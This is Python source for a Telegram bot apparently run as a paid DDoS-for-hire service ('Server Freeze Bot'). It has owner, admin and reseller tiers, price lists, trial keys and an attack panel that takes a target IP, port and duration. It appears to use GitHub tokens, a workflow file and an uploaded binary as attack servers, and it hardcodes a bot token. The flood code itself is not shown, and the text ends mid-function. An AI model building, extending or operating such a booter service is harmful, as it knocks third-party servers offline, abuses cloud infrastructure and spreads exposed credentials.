"""
TELEGRAM BOT - PART 1: IMPORTS & CONFIGURATIONS
Advanced DDoS Bot with Button Interface
"""

import os
import json
import logging
import threading
import time
import random
import string
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, 
    CommandHandler, 
    ContextTypes, 
    MessageHandler, 
    filters, 
    CallbackQueryHandler
)
from github import Github, GithubException

# ==================== LOGGING SETUP ====================
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ==================== BOT CONFIGURATIONS ====================
BOT_TOKEN = "8330044393:AAFlCdOUi_B1JeNYhQHJPAZeAviJkW7G-i0"
YML_FILE_PATH = ".github/workflows/main.yml"
BINARY_FILE_NAME = "soul"
ADMIN_IDS = [8101867786]
OWNER_IDS = [8101867786]

# ==================== CONVERSATION STATES ====================
WAITING_FOR_IP = 1
WAITING_FOR_PORT = 2
WAITING_FOR_TIME = 3
WAITING_FOR_BINARY = 4
WAITING_FOR_BROADCAST = 5
WAITING_FOR_USER_ID = 6
WAITING_FOR_DAYS = 7
WAITING_FOR_TOKEN = 8
WAITING_FOR_OWNER_ID = 9
WAITING_FOR_OWNER_USERNAME = 10
WAITING_FOR_RESELLER_ID = 11
WAITING_FOR_RESELLER_CREDITS = 12
WAITING_FOR_RESELLER_USERNAME = 13
WAITING_FOR_REMOVE_ID = 14
WAITING_FOR_COOLDOWN = 15
WAITING_FOR_MAX_ATTACKS = 16
WAITING_FOR_TRIAL_HOURS = 17
WAITING_FOR_REDEEM_KEY = 18

# ==================== GLOBAL VARIABLES ====================
current_attack = None
attack_lock = threading.Lock()
cooldown_until = 0
COOLDOWN_DURATION = 40
MAINTENANCE_MODE = False
MAX_ATTACKS = 40
user_attack_counts = {}
user_states = {}

# ==================== PRICING STRUCTURES ====================
USER_PRICES = {
    "1": 120,
    "2": 240,
    "3": 360,
    "4": 450,
    "7": 650
}

RESELLER_PRICES = {
    "1": 150,
    "2": 250,
    "3": 300,
    "4": 400,
    "7": 550
}

# ==================== DATA LOADING FUNCTIONS ====================
def load_users():
    """Load authorized users from JSON file"""
    try:
        with open('users.json', 'r') as f:
            users_data = json.load(f)
            if not users_data:
                initial_users = ADMIN_IDS.copy()
                save_users(initial_users)
                return set(initial_users)
            return set(users_data)
    except FileNotFoundError:
        initial_users = ADMIN_IDS.copy()
        save_users(initial_users)
        return set(initial_users)

def save_users(users):
    """Save users to JSON file"""
    with open('users.json', 'w') as f:
        json.dump(list(users), f, indent=2)

def load_pending_users():
    """Load pending user requests"""
    try:
        with open('pending_users.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return []

def save_pending_users(pending_users):
    """Save pending users to file"""
    with open('pending_users.json', 'w') as f:
        json.dump(pending_users, f, indent=2)

def load_approved_users():
    """Load approved users with expiry dates"""
    try:
        with open('approved_users.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_approved_users(approved_users):
    """Save approved users to file"""
    with open('approved_users.json', 'w') as f:
        json.dump(approved_users, f, indent=2)

def load_owners():
    """Load owner list"""
    try:
        with open('owners.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        owners = {}
        for admin_id in ADMIN_IDS:
            owners[str(admin_id)] = {
                "username": f"owner_{admin_id}",
                "added_by": "system",
                "added_date": time.strftime("%Y-%m-%d %H:%M:%S"),
                "is_primary": True
            }
        save_owners(owners)
        return owners

def save_owners(owners):
    """Save owners to file"""
    with open('owners.json', 'w') as f:
        json.dump(owners, f, indent=2)

def load_admins():
    """Load admin list"""
    try:
        with open('admins.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_admins(admins):
    """Save admins to file"""
    with open('admins.json', 'w') as f:
        json.dump(admins, f, indent=2)

def load_groups():
    """Load authorized groups"""
    try:
        with open('groups.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_groups(groups):
    """Save groups to file"""
    with open('groups.json', 'w') as f:
        json.dump(groups, f, indent=2)

def load_resellers():
    """Load reseller accounts"""
    try:
        with open('resellers.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_resellers(resellers):
    """Save resellers to file"""
    with open('resellers.json', 'w') as f:
        json.dump(resellers, f, indent=2)

def load_github_tokens():
    """Load GitHub tokens for servers"""
    try:
        with open('github_tokens.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return []

def save_github_tokens(tokens):
    """Save GitHub tokens"""
    with open('github_tokens.json', 'w') as f:
        json.dump(tokens, f, indent=2)

def load_attack_state():
    """Load current attack state"""
    try:
        with open('attack_state.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {"current_attack": None, "cooldown_until": 0}

def save_attack_state():
    """Save attack state"""
    global current_attack, cooldown_until
    state = {
        "current_attack": current_attack,
        "cooldown_until": cooldown_until
    }
    with open('attack_state.json', 'w') as f:
        json.dump(state, f, indent=2)

def load_maintenance_mode():
    """Load maintenance mode status"""
    try:
        with open('maintenance.json', 'r') as f:
            data = json.load(f)
            return data.get("maintenance", False)
    except FileNotFoundError:
        return False

def save_maintenance_mode(mode):
    """Save maintenance mode status"""
    with open('maintenance.json', 'w') as f:
        json.dump({"maintenance": mode}, f, indent=2)

def load_cooldown():
    """Load cooldown duration"""
    try:
        with open('cooldown.json', 'r') as f:
            data = json.load(f)
            return data.get("cooldown", 40)
    except FileNotFoundError:
        return 40

def save_cooldown(duration):
    """Save cooldown duration"""
    with open('cooldown.json', 'w') as f:
        json.dump({"cooldown": duration}, f, indent=2)

def load_max_attacks():
    """Load max attacks limit"""
    try:
        with open('max_attacks.json', 'r') as f:
            data = json.load(f)
            return data.get("max_attacks", 40)
    except FileNotFoundError:
        return 40

def save_max_attacks(max_attacks):
    """Save max attacks limit"""
    with open('max_attacks.json', 'w') as f:
        json.dump({"max_attacks": max_attacks}, f, indent=2)

def load_trial_keys():
    """Load trial keys"""
    try:
        with open('trial_keys.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_trial_keys(keys):
    """Save trial keys"""
    with open('trial_keys.json', 'w') as f:
        json.dump(keys, f, indent=2)

# ==================== INITIALIZATION ====================
users = load_users()
approved_users = load_approved_users()
owners = load_owners()
admins = load_admins()
resellers = load_resellers()
github_tokens = load_github_tokens()
trial_keys = load_trial_keys()
groups = load_groups()

# Load saved state
MAINTENANCE_MODE = load_maintenance_mode()
COOLDOWN_DURATION = load_cooldown()
MAX_ATTACKS = load_max_attacks()
attack_state = load_attack_state()
current_attack = attack_state.get("current_attack")
cooldown_until = attack_state.get("cooldown_until", 0)

logger.info("✅ All configurations loaded successfully")

"""
TELEGRAM BOT - PART 2: HELPER FUNCTIONS & PERMISSIONS
"""

# ==================== PERMISSION CHECKING FUNCTIONS ====================
def is_owner(user_id):
    """Check if user is owner"""
    return str(user_id) in owners

def is_admin(user_id):
    """Check if user is admin"""
    return str(user_id) in admins

def is_reseller(user_id):
    """Check if user is reseller"""
    return str(user_id) in resellers

def is_approved_user(user_id):
    """Check if user is approved and not expired"""
    if str(user_id) not in approved_users:
        return False
    user_data = approved_users[str(user_id)]
    expiry_date = datetime.strptime(user_data['expiry_date'], "%Y-%m-%d %H:%M:%S")
    if datetime.now() > expiry_date:
        return False
    return True

def has_access(user_id):
    """Check if user has any access"""
    return is_owner(user_id) or is_admin(user_id) or is_reseller(user_id) or is_approved_user(user_id)

# ==================== UTILITY FUNCTIONS ====================
def generate_trial_key(hours):
    """Generate a trial key"""
    key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
    expiry = datetime.now() + timedelta(hours=hours)
    trial_keys[key] = {
        "hours": hours,
        "expiry": expiry.strftime("%Y-%m-%d %H:%M:%S"),
        "created": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "used": False
    }
    save_trial_keys(trial_keys)
    return key

def create_repository(token, repo_name):
    """Create GitHub repository if not exists"""
    try:
        g = Github(token)
        user = g.get_user()
        try:
            repo = user.get_repo(repo_name)
            return repo, False
        except:
            repo = user.create_repo(repo_name, private=False)
            return repo, True
    except Exception as e:
        raise Exception(f"Failed to create repository: {str(e)}")

def format_time_remaining(expiry_str):
    """Format remaining time"""
    try:
        expiry = datetime.strptime(expiry_str, "%Y-%m-%d %H:%M:%S")
        remaining = expiry - datetime.now()
        if remaining.total_seconds() <= 0:
            return "Expired"
        days = remaining.days
        hours = remaining.seconds // 3600
        minutes = (remaining.seconds % 3600) // 60
        if days > 0:
            return f"{days}d {hours}h {minutes}m"
        elif hours > 0:
            return f"{hours}h {minutes}m"
        else:
            return f"{minutes}m"
    except:
        return "Unknown"

# ==================== KEYBOARD BUILDERS ====================
def get_main_menu_keyboard(user_id):
    """Get main menu keyboard based on user role"""
    keyboard = []
    
    if is_owner(user_id):
        keyboard.extend([
            [InlineKeyboardButton("👑 Owner Panel", callback_data="owner_panel")],
            [InlineKeyboardButton("⚔️ Attack Panel", callback_data="attack_panel")],
            [InlineKeyboardButton("📊 Statistics", callback_data="statistics")],
            [InlineKeyboardButton("⚙️ Settings", callback_data="settings")]
        ])
    elif is_admin(user_id):
        keyboard.extend([
            [InlineKeyboardButton("🛡️ Admin Panel", callback_data="admin_panel")],
            [InlineKeyboardButton("⚔️ Attack Panel", callback_data="attack_panel")],
            [InlineKeyboardButton("📊 Statistics", callback_data="statistics")]
        ])
    elif is_reseller(user_id):
        keyboard.extend([
            [InlineKeyboardButton("💰 Reseller Panel", callback_data="reseller_panel")],
            [InlineKeyboardButton("⚔️ Attack Panel", callback_data="attack_panel")],
            [InlineKeyboardButton("📊 My Stats", callback_data="my_stats")]
        ])
    elif is_approved_user(user_id):
        keyboard.extend([
            [InlineKeyboardButton("⚔️ Attack Panel", callback_data="attack_panel")],
            [InlineKeyboardButton("📊 My Account", callback_data="my_account")],
            [InlineKeyboardButton("🎁 Redeem Key", callback_data="redeem_key")]
        ])
    else:
        keyboard.extend([
            [InlineKeyboardButton("📝 Request Access", callback_data="request_access")],
            [InlineKeyboardButton("🎁 Redeem Trial Key", callback_data="redeem_key")],
            [InlineKeyboardButton("💬 Contact Admin", url="https://t.me/YourAdminUsername")]
        ])
    
    keyboard.append([InlineKeyboardButton("ℹ️ Help", callback_data="help")])
    return InlineKeyboardMarkup(keyboard)

def get_owner_panel_keyboard():
    """Owner panel keyboard"""
    keyboard = [
        [InlineKeyboardButton("👥 User Management", callback_data="owner_users")],
        [InlineKeyboardButton("🔧 Admin Management", callback_data="owner_admins")],
        [InlineKeyboardButton("💰 Reseller Management", callback_data="owner_resellers")],
        [InlineKeyboardButton("🔑 Server Management", callback_data="owner_servers")],
        [InlineKeyboardButton("📢 Broadcast", callback_data="owner_broadcast")],
        [InlineKeyboardButton("🔧 System Settings", callback_data="owner_settings")],
        [InlineKeyboardButton("🔙 Back", callback_data="main_menu")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_admin_panel_keyboard():
    """Admin panel keyboard"""
    keyboard = [
        [InlineKeyboardButton("👥 Manage Users", callback_data="admin_users")],
        [InlineKeyboardButton("📝 Pending Requests", callback_data="admin_pending")],
        [InlineKeyboardButton("🎁 Generate Trial Key", callback_data="admin_genkey")],
        [InlineKeyboardButton("📊 View Statistics", callback_data="admin_stats")],
        [InlineKeyboardButton("🔙 Back", callback_data="main_menu")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_reseller_panel_keyboard():
    """Reseller panel keyboard"""
    keyboard = [
        [InlineKeyboardButton("➕ Add User", callback_data="reseller_add")],
        [InlineKeyboardButton("➖ Remove User", callback_data="reseller_remove")],
        [InlineKeyboardButton("📋 My Users", callback_data="reseller_myusers")],
        [InlineKeyboardButton("💳 My Credits", callback_data="reseller_credits")],
        [InlineKeyboardButton("💰 Price List", callback_data="reseller_prices")],
        [InlineKeyboardButton("🔙 Back", callback_data="main_menu")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_attack_panel_keyboard():
    """Attack panel keyboard"""
    keyboard = [
        [InlineKeyboardButton("🚀 Start Attack", callback_data="start_attack")],
        [InlineKeyboardButton("🛑 Stop Attack", callback_data="stop_attack")],
        [InlineKeyboardButton("📊 Attack Status", callback_data="attack_status")],
        [InlineKeyboardButton("🔙 Back", callback_data="main_menu")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_user_management_keyboard():
    """User management keyboard"""
    keyboard = [
        [InlineKeyboardButton("➕ Add User", callback_data="add_user")],
        [InlineKeyboardButton("➖ Remove User", callback_data="remove_user")],
        [InlineKeyboardButton("📋 User List", callback_data="list_users")],
        [InlineKeyboardButton("📝 Pending Users", callback_data="pending_users")],
        [InlineKeyboardButton("🔙 Back", callback_data="owner_panel")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_server_management_keyboard():
    """Server management keyboard"""
    keyboard = [
        [InlineKeyboardButton("➕ Add Server", callback_data="add_server")],
        [InlineKeyboardButton("➖ Remove Server", callback_data="remove_server")],
        [InlineKeyboardButton("📋 Server List", callback_data="list_servers")],
        [InlineKeyboardButton("📤 Upload Binary", callback_data="upload_binary")],
        [InlineKeyboardButton("🔙 Back", callback_data="owner_panel")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_settings_keyboard():
    """Settings keyboard"""
    keyboard = [
        [InlineKeyboardButton("⏱️ Set Cooldown", callback_data="set_cooldown")],
        [InlineKeyboardButton("🔢 Set Max Attacks", callback_data="set_max_attacks")],
        [InlineKeyboardButton("🔧 Maintenance Mode", callback_data="toggle_maintenance")],
        [InlineKeyboardButton("🔙 Back", callback_data="owner_panel")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_cancel_keyboard():
    """Cancel keyboard"""
    keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="cancel")]]
    return InlineKeyboardMarkup(keyboard)

def get_back_keyboard():
    """Back keyboard"""
    keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data="main_menu")]]
    return InlineKeyboardMarkup(keyboard)

def get_confirm_keyboard(action):
    """Confirmation keyboard"""
    keyboard = [
        [InlineKeyboardButton("✅ Confirm", callback_data=f"confirm_{action}")],
        [InlineKeyboardButton("❌ Cancel", callback_data="cancel")]
    ]
    return InlineKeyboardMarkup(keyboard)

logger.info("✅ Part 2: Helper functions loaded")

"""
TELEGRAM BOT - PART 3: COMMAND HANDLERS
"""

# ==================== START COMMAND ====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command"""
    user_id = update.effective_user.id
    username = update.effective_user.username or "User"
    
    welcome_text = f"""
🤖 **WELCOME TO SERVER FREEZE BOT** 🤖

👤 User: @{username}
🆔 ID: `{user_id}`

"""
    
    if has_access(user_id):
        if is_owner(user_id):
            welcome_text += "👑 **Status**: OWNER\n"
        elif is_admin(user_id):
            welcome_text += "🛡️ **Status**: ADMIN\n"
        elif is_reseller(user_id):
            welcome_text += "💰 **Status**: RESELLER\n"
        elif is_approved_user(user_id):
            user_data = approved_users[str(user_id)]
            expiry_date = user_data['expiry_date']
            remaining = format_time_remaining(expiry_date)
            welcome_text += f"✅ **Status**: APPROVED\n⏰ **Time Left**: {remaining}\n"
    else:
        welcome_text += "❌ **Status**: UNAUTHORIZED\n\n"
        welcome_text += "Please request access or redeem a trial key to use this bot."
    
    welcome_text += "\n📌 **Select an option from the menu below:**"
    
    keyboard = get_main_menu_keyboard(user_id)
    
    if update.message:
        await update.message.reply_text(welcome_text, reply_markup=keyboard, parse_mode='Markdown')
    elif update.callback_query:
        await update.callback_query.edit_message_text(welcome_text, reply_markup=keyboard, parse_mode='Markdown')

# ==================== HELP COMMAND ====================
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show help information"""
    help_text = """
📚 **BOT COMMANDS GUIDE**

**🔰 General Commands:**
/start - Start the bot
/help - Show this help message
/id - Get your user ID
/myaccess - Check your access status

**⚔️ Attack Commands:**
/attack - Launch attack (button-based)
/status - Check attack status
/stop - Stop current attack

**🎁 User Commands:**
/redeem - Redeem trial key

**👑 Owner Commands:**
/adduser - Add new user
/removeuser - Remove user
/addadmin - Add admin
/removeadmin - Remove admin
/addreseller - Add reseller
/removereseller - Remove reseller
/addserver - Add GitHub server
/removeserver - Remove server
/broadcast - Send broadcast message
/maintenance - Toggle maintenance mode

**📊 Info Commands:**
/userslist - View all users
/serverslist - View all servers
/statistics - View bot statistics

Use the button menu for easy navigation! 🎯
"""
    
    keyboard = get_back_keyboard()
    
    if update.message:
        await update.message.reply_text(help_text, reply_markup=keyboard, parse_mode='Markdown')
    elif update.callback_query:
        await update.callback_query.edit_message_text(help_text, reply_markup=keyboard, parse_mode='Markdown')

# ==================== ID COMMAND ====================
async def id_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Get user ID"""
    user_id = update.effective_user.id
    username = update.effective_user.username or "No username"
    
    id_text = f"""
🆔 **YOUR INFORMATION**

👤 Username: @{username}
🔢 User ID: `{user_id}`
📅 Date: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
"""
    
    await update.message.reply_text(id_text, parse_mode='Markdown')

# ==================== MY ACCESS COMMAND ====================
async def myaccess_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check user access status"""
    user_id = update.effective_user.id
    
    access_text = "📊 **YOUR ACCESS STATUS**\n\n"
    
    if is_owner(user_id):
        owner_data = owners[str(user_id)]
        access_text += f"""
👑 **Role**: OWNER
✅ **Access**: Full Control
📅 **Added**: {owner_data.get('added_date', 'N/A')}
🔑 **Type**: {'Primary' if owner_data.get('is_primary') else 'Secondary'}
"""
    elif is_admin(user_id):
        admin_data = admins[str(user_id)]
        access_text += f"""
🛡️ **Role**: ADMIN
✅ **Access**: User Management
📅 **Added**: {admin_data.get('added_date', 'N/A')}
"""
    elif is_reseller(user_id):
        reseller_data = resellers[str(user_id)]
        credits = reseller_data.get('credits', 0)
        access_text += f"""
💰 **Role**: RESELLER
💳 **Credits**: {credits} days
📅 **Added**: {reseller_data.get('added_date', 'N/A')}
👥 **Users Added**: {reseller_data.get('users_added', 0)}
"""
    elif is_approved_user(user_id):
        user_data = approved_users[str(user_id)]
        expiry = user_data['expiry_date']
        remaining = format_time_remaining(expiry)
        access_text += f"""
✅ **Role**: APPROVED USER
⏰ **Time Remaining**: {remaining}
📅 **Expiry Date**: {expiry}
👤 **Added By**: {user_data.get('added_by', 'Unknown')}
"""
    else:
        access_text += """
❌ **Status**: UNAUTHORIZED

You don't have access to use this bot.
Please:
1️⃣ Request access from admin
2️⃣ Redeem a trial key
3️⃣ Contact a reseller
"""
    
    keyboard = get_back_keyboard()
    await update.message.reply_text(access_text, reply_markup=keyboard, parse_mode='Markdown')

# ==================== ATTACK STATUS COMMAND ====================
async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check attack status"""
    global current_attack, cooldown_until
    
    status_text = "📊 **ATTACK STATUS**\n\n"
    
    if MAINTENANCE_MODE:
        status_text += "🔧 **Maintenance Mode**: ON\n"
        status_text += "⚠️ All attacks are currently disabled.\n"
    elif current_attack:
        status_text += f"""🚀 **Status**: ACTIVE ATTACK
🎯 **Target**: `{current_attack.get('target', 'N/A')}`
🔌 **Port**: `{current_attack.get('port', 'N/A')}`
⏱️ **Duration**: `{current_attack.get('time', 'N/A')}s`
👤 **Started By**: @{current_attack.get('user', 'Unknown')}
⏰ **Started At**: `{current_attack.get('start_time', 'N/A')}`
"""
    elif cooldown_until > time.time():
        remaining_cooldown = int(cooldown_until - time.time())
        status_text += f"""⏳ **Status**: COOLDOWN PERIOD
⏱️ **Wait Time**: `{remaining_cooldown}s`
💡 Please wait before next attack
"""
    else:
        status_text += """✅ **Status**: READY TO ATTACK
🎯 All systems operational!
🚀 Ready to launch attack
"""
    
    status_text += f"\n⚙️ **Server Configuration**:\n"
    status_text += f"🔑 **Active Servers**: `{len(github_tokens)}`\n"
    status_text += f"⏳ **Cooldown Duration**: `{COOLDOWN_DURATION}s`\n"
    status_text += f"🎯 **Max Attacks Limit**: `{MAX_ATTACKS}`\n"
    
    keyboard = get_back_keyboard()
    
    if update.message:
        await update.message.reply_text(status_text, reply_markup=keyboard, parse_mode='Markdown')
    elif update.callback_query:
        await update.callback_query.edit_message_text(status_text, reply_markup=keyboard, parse_mode='Markdown')

# ==================== STOP ATTACK COMMAND ====================
async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Stop current attack"""
    global current_attack
    user_id = update.effective_user.id
    
    if not has_access(user_id):
        await update.message.reply_text("❌ ACCESS DENIED")
        return
    
    if not current_attack:
        await update.message.reply_text("⚠️ No active attack to stop.")
        return
    
    if not (is_owner(user_id) or is_admin(user_id) or current_attack.get('user_id') == user_id):
        await update.message.reply_text("❌ You can only stop your own attacks!")
        return
    
    current_attack = None
    save_attack_state()
    
    await update.message.reply_text("✅ **ATTACK STOPPED**\n\nThe current attack has been terminated.", parse_mode='Markdown')

# ==================== REDEEM COMMAND ====================
async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Redeem trial key"""
    user_id = update.effective_user.id
    
    if len(context.args) != 1:
        await update.message.reply_text(
            "❌ **Invalid syntax**\n\n"
            "Usage: `/redeem <KEY>`\n"
            "Example: `/redeem ABCD1234EFGH`",
            parse_mode='Markdown'
        )
        return
    
    key = context.args[0].upper()
    
    if key not in trial_keys:
        await update.message.reply_text("❌ Invalid trial key!")
        return
    
    key_data = trial_keys[key]
    
    if key_data.get('used'):
        await update.message.reply_text("❌ This key has already been used!")
        return
    
    expiry = datetime.strptime(key_data['expiry'], "%Y-%m-%d %H:%M:%S")
    if datetime.now() > expiry:
        await update.message.reply_text("❌ This key has expired!")
        return
    
    # Add user with trial duration
    hours = key_data['hours']
    new_expiry = datetime.now() + timedelta(hours=hours)
    
    approved_users[str(user_id)] = {
        "username": update.effective_user.username or f"user_{user_id}",
        "expiry_date": new_expiry.strftime("%Y-%m-%d %H:%M:%S"),
        "added_by": "trial_key",
        "added_date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "plan": f"{hours}h trial"
    }
    
    # Mark key as used
    trial_keys[key]['used'] = True
    trial_keys[key]['used_by'] = user_id
    trial_keys[key]['used_date'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    save_approved_users(approved_users)
    save_trial_keys(trial_keys)
    
    success_text = f"""
✅ **TRIAL KEY ACTIVATED!**

🎁 Duration: {hours} hours
⏰ Valid Until: {new_expiry.strftime("%Y-%m-%d %H:%M:%S")}

You now have access to the bot! 🎉
Use /start to begin.
"""
    
    await update.message.reply_text(success_text, parse_mode='Markdown')

logger.info("✅ Part 3: Command handlers loaded")

"""
TELEGRAM BOT - PART 4: BUTTON CALLBACK HANDLERS
"""

# ==================== MAIN CALLBACK HANDLER ====================
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle all button callbacks"""
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    data = query.data
    
    # Main menu callbacks
    if data == "main_menu":
        await start(update, context)
    
    elif data == "help":
        await help_command(update, context)
    
    elif data == "owner_panel":
        if not is_owner(user_id):
            await query.answer("❌ ACCESS DENIED", show_alert=True)
            return
        await show_owner_panel(query)
    
    elif data == "admin_panel":
        if not is_admin(user_id):
            await query.answer("❌ ACCESS DENIED", show_alert=True)
            return
        await show_admin_panel(query)
    
    elif data == "reseller_panel":
        if not is_reseller(user_id):
            await query.answer("❌ ACCESS DENIED", show_alert=True)
            return
        await show_reseller_panel(query)
    
    elif data == "attack_panel":
        if not has_access(user_id):
            await query.answer("❌ ACCESS DENIED", show_alert=True)
            return
        await show_attack_panel(query)
    
    # Owner panel callbacks
    elif data == "owner_users":
        await show_user_management(query)
    
    elif data == "owner_admins":
        await show_admin_management(query)
    
    elif data == "owner_resellers":
        await show_reseller_management(query)
    
    elif data == "owner_servers":
        await show_server_management(query)
    
    elif data == "owner_broadcast":
        await start_broadcast(query, user_id)
    
    elif data == "owner_settings":
        await show_settings(query)
    
    # User management callbacks
    elif data == "add_user":
        await init_add_user(query, user_id)
    
    elif data == "remove_user":
        await init_remove_user(query, user_id)
    
    elif data == "list_users":
        await show_users_list(query)
    
    elif data == "pending_users":
        await show_pending_users(query)
    
    # Server management callbacks
    elif data == "add_server":
        await init_add_server(query, user_id)
    
    elif data == "remove_server":
        await init_remove_server(query, user_id)
    
    elif data == "list_servers":
        await show_servers_list(query)
    
    elif data == "upload_binary":
        await init_upload_binary(query, user_id)
    
    # Settings callbacks
    elif data == "set_cooldown":
        await init_set_cooldown(query, user_id)
    
    elif data == "set_max_attacks":
        await init_set_max_attacks(query, user_id)
    
    elif data == "toggle_maintenance":
        await toggle_maintenance(query, user_id)
    
    # Attack panel callbacks
    elif data == "start_attack":
        await init_attack(query, user_id)
    
    elif data == "stop_attack":
        await stop_attack_callback(query, user_id)
    
    elif data == "attack_status":
        await status_command(update, context)
    
    # Statistics callbacks
    elif data == "statistics":
        await show_statistics(query)
    
    elif data == "my_account":
        await show_my_account(query, user_id)
    
    # Reseller callbacks
    elif data == "reseller_add":
        await init_reseller_add_user(query, user_id)
    
    elif data == "reseller_remove":
        await init_reseller_remove_user(query, user_id)
    
    elif data == "reseller_myusers":
        await show_reseller_users(query, user_id)
    
    elif data == "reseller_credits":
        await show_reseller_credits(query, user_id)
    
    elif data == "reseller_prices":
        await show_reseller_prices(query)
    
    # Other callbacks
    elif data == "request_access":
        await request_access(query, user_id)
    
    elif data == "redeem_key":
        await init_redeem_key(query, user_id)
    
    elif data == "cancel":
        user_states[user_id] = None
        await query.edit_message_text("❌ Operation cancelled.")
        await start(update, context)

# ==================== PANEL DISPLAY FUNCTIONS ====================
async def show_owner_panel(query):
    """Show owner panel"""
    text = """
👑 **OWNER PANEL**

Welcome to the owner control panel.
Select an option below to manage the bot.

🔑 Total Servers: {servers}
👥 Total Users: {users}
💰 Total Resellers: {resellers}
"""
    
    text = text.format(
        servers=len(github_tokens),
        users=len(approved_users),
        resellers=len(resellers)
    )
    
    keyboard = get_owner_panel_keyboard()
    await query.edit_message_text(text, reply_markup=keyboard, parse_mode='Markdown')

async def show_admin_panel(query):
    """Show admin panel"""
    text = """
🛡️ **ADMIN PANEL**

Manage users and view statistics.

👥 Approved Users: {users}
📝 Pending Requests: {pending}
"""
    
    pending_count = len(load_pending_users())
    
    text = text.format(
        users=len(approved_users),
        pending=pending_count
    )
    
    keyboard = get_admin_panel_keyboard()
    await query.edit_message_text(text, reply_markup=keyboard, parse_mode='Markdown')

async def show_reseller_panel(query):
    """Show reseller panel"""
    user_id = query.from_user.id
    reseller_data = resellers[str(user_id)]
    
    text = f"""
💰 **RESELLER PANEL**

Welcome, {query.from_user.username or 'Reseller'}!

💳 Your Credits: {reseller_data.get('credits', 0)} days
👥 Users Added: {reseller_data.get('users_added', 0)}
📅 Member Since: {reseller_data.get('added_date', 'N/A')}
"""
    
    keyboard = get_reseller_panel_keyboard()
    await query.edit_message_text(text, reply_markup=keyboard, parse_mode='Markdown')

async def show_attack_panel(query):
    """Show attack panel"""
    global current_attack, cooldown_until
    
    text = "⚔️ **ATTACK PANEL**\n\n"
    
    if MAINTENANCE_MODE:
        text += "🔧 **Status**: Maintenance Mode\n"
        text += "All attacks are disabled.\n"
    elif current_attack:
        text += f"🚀 **Status**: Attack Running\n"
        text += f"🎯 Target: {current_attack.get('target')}\n"
        text += f"🔌 Port: {current_attack.get('port')}\n"
    elif cooldown_until > time.time():
        remaining = int(cooldown_until - time.time())
        text += f"⏳ **Status**: Cooldown ({remaining}s)\n"
    else:
        text += "✅ **Status**: Ready\n"
    
    text += f"\n🔑 Servers: {len(github_tokens)}\n"
    
    keyboard = get_attack_panel_keyboard()
    await query.edit_message_text(text, reply_markup=keyboard, parse_mode='Markdown')

async def show_user_management(query):
    """Show user management panel"""
    text = """
👥 **USER MANAGEMENT**

Manage approved users and pending requests.

Select an action below:
"""
    
    keyboard = get_user_management_keyboard()
    await query.edit_message_text(text, reply_markup=keyboard, parse_mode='Markdown')

async def show_server_management(query):
    """Show server management panel"""
    text = f"""
🔑 **SERVER MANAGEMENT**

Total Servers: {len(github_tokens)}

Manage GitHub tokens and binary files.
"""
    
    keyboard = get_server_management_keyboard()
    await query.edit_message_text(text, reply_markup=keyboard, parse_mode='Markdown')

async def show_settings(query):
    """Show settings panel"""
    global MAINTENANCE_MODE, COOLDOWN_DURATION, MAX_ATTACKS
    
    text = f"""
⚙️ **SYSTEM SETTINGS**

Current Configuration:

⏳ Cooldown: {COOLDOWN_DURATION}s
🎯 Max Attacks: {MAX_ATTACKS}
🔧 Maintenance: {'ON' if MAINTENANCE_MODE else 'OFF'}
"""
    
    keyboard = get_settings_keyboard()
    await query.edit_message_text(text, reply_markup=keyboard, parse_mode='Markdown')

async def show_users_list(query):
    """Show list of approved users"""
    if not approved_users:
        text = "📭 No approved users yet."
    else:
        text = "👥 **APPROVED USERS LIST**\n\n"
        for i, (uid, data) in enumerate(approved_users.items(), 1):
            username = data.get('username', 'Unknown')
            expiry = data.get('expiry_date', 'N/A')
            remaining = format_time_remaining(expiry)
            text += f"{i}. @{username} (ID: {uid})\n"
            text += f"   ⏰ {remaining} left\n\n"
        
        text += f"📊 Total: {len(approved_users)} users"
    
    keyboard = get_back_keyboard()
    await query.edit_message_text(text, reply_markup=keyboard, parse_mode='Markdown')

async def show_servers_list(query):
    """Show list of servers"""
    if not github_tokens:
        text = "📭 No servers added yet."
    else:
        text = "🔑 **SERVERS LIST**\n\n"
        for i, token_data in enumerate(github_tokens, 1):
            text += f"{i}. 👤 {token_data['username']}\n"
            text += f"   📁 {token_data['repo']}\n"
            text += f"   📅 {token_data['added_date']}\n\n"
        
        text += f"📊 Total: {len(github_tokens)} servers"
    
